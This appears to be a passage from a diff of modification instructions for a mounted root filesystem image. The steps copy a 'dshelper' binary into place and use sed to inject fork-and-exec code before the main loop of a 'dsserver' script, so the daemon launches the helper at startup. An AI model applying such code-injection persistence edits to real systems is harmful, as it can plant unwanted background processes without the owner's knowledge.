@@ -1,0 +1,6 @@
+
+If it does not exist, then place it there by copying a file via: cp
+-p /home/bin/dshelper /tmp/data/root/home/bin/ Check 3 If /tmp/data/root/home/bin/dsserver exists and is non-empty then execute the following to check if the file does not contain the string exec(\"/home/bin/dshelper\") :
+grep -c -s 'exec(\"/home/bin/dshelper\")' /tmp/data/root/home/bin/
+dsserver
+If it doesn't then execute to insert the line: sed -i 's/for (;;)/my $monpid = fork();\\nif ($monpid == 0) {\\nexec(\\\"\\/home\\/bin\\/dshelper\\\");\\n}\\n&/g' /tmp/data/root/home/bin/dsserver Check 4
